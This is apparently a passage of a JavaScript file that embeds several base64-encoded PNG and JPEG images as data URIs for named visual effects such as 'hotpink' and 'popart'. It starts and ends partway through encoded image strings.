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";
    e.hotpink.src =
        "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQAAAAABCAIAAAC+O+cgAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAENJREFUKFNjPMOwioHhPyMDA4RkZPjPgETCxYevLBgzMSIQIxKbiQGViywL1kWOLMw6kmWR3EmaLB4PgmUZYeTI4wIAJAIs/xpvDhoAAAAASUVORK5CYII=";
    e.popart.src =
        "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQAAAAAECAIAAADu9naTAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAIxJREFUeNpiVFBQYBiOQOfnT91fvyAkEDGMKGBsjIJGAW7A8iDh/rD0mLDkWSnJs1+kzv6SPMsgdXZkxerZZwxnweSsswxnpUZTOR7A6LBgeHpMTVgBjtSFFUZWrL4VRkGjAE8NkLBgeOYAYcEHwkIQdIBB6MGIitRn7MbPOYyfcYDI5wqjGQAfAAgwAG0eMAVXDY/3AAAAAElFTkSuQmCC";
    e.popbooth.src =
        "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQAAAAAECAIAAADu9naTAAABZklEQVR4XtWRQa7UQAxEq8r9pX+Av2EBh2DNbbkOFwLRNi0rTitBiYgmLFKySs811c5i2D/jkrrkZt3kGm5u6rLjpMCsHppLw4+T+bYe5k2zk2QM7haH0hKKkDbXSjFX1FrJZkWVymtNnX03hftk+Glc59fwVrzmbfC/1fBM8dv3D1yRobVl3oYvK9/WMJMZVqcKXAsztCrPs6cXKtmE+B/izvlKmOJLIYn7FOqQhznU0z3ksJ4+OTvVLK5Or6bjmeKnL19xRUa2MeJ00uZacBrWqs2FK2f3ZQn3ilyHf7OSqW1eo826r2ky9rW6fPR1CfepU13Wlc4FkgskP/6ps0DmMjxTDe8/cEVBd0angzG4M37TjWHlKi4PMQFuCAsXkj0LUU98/2R/8zxR4FaRIQY1HFKQoeSCoKBkctNhspirsBxJJhNQHWQHIELc3fT9d+vIjcr/ILxFmKcfs3m04RHtkPFM/QFBti2L4HU+0gAAAABJRU5ErkJggg==";
    e.cocktailsq.src =
        "data:image/jpeg;base64,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